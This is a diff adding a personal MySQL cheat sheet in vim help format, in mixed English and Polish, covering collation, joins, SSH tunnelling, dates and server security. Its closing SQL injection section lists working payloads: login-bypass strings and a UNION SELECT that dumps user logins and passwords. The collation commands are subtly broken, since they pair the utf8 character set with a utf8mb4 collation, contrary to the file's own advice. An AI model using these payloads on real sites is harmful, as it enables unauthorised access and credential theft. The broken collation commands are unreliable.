@@ -1,0 +1,77 @@
+*-sql*
+
+==============================================================================
+COLLATION
+
+Only use this
+	utf8mb4_unicode_ci
+
+- MySQL’s “utf8mb4” means “UTF-8”.
+- MySQL’s “utf8” means “a proprietary character encoding”. This encoding can’t encode many Unicode characters.
+
+Check~
+USE db_name;
+show variables like "character_set_database";
+show variables like "collation_database";
+SHOW CREATE DATABASE db_name;
+
+Set~
+DEFAULT CHARACTER SET utf8 COLLATE utf8mb4_unicode_ci;
+
+Convert~
+ALTER DATABASE db_name DEFAULT CHARACTER SET utf8 COLLATE utf8mb4_unicode_ci;
+ALTER TABLE db_table CONVERT TO CHARACTER SET utf8 COLLATE utf8mb4_unicode_ci;
+
+==============================================================================
+JOINS
+
+SQL-Joins.png
+
+==============================================================================
+SSH TUNNEL
+
+ssh -L 3306:127.0.0.1:3306 user@example.com
+
+==============================================================================
+DATES AND TIME
+
+Use DATETIME fields and store UTC formatted values only.
+
+http://www.webdevelopersdiary.com/1/post/2012/6/good-to-know-how-to-properly-store-date-and-time-values-in-mysql.html
+
+
+==============================================================================
+SECURITY
+
+General Tips~
+
+- Do not ever give anyone (except MySQL root accounts) access to the user table in the mysql database! This is critical.
+- Do not grant more privileges than necessary. Never grant privileges to all hosts.
+	- mysql -u root - sprawdza czy jest hasło dla roota
+	- SHOW GRANTS
+- Firewall port 3306
+	- Try to scan your ports from the Internet (telnet server_host 3306)
+- Szyfrowanie komunikacji, SSL lub SSH
+- Never run the MySQL server as the Unix root user
+- Make sure that the only Unix user account with read or write privileges in the database directories is the account that is used for running mysqld. 
+
+SQL injection~
+
+Zwykłe pole, np. search:
+' OR 1 --
+" OR 1 --
+
+Formularz logowania:
+
+name:
+' OR '1'='1
+
+password:
+' OR '2'>'1
+
+Union, ilość pól w drugim zapytaniu musi być równa ilości w pierwszym, stąd te jedynki. Zmień nazwy pól, aby wyświetlić wynik na stronie
+') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+
+
+
+vim:tw=78:ts=8:noet:ft=help:norl:
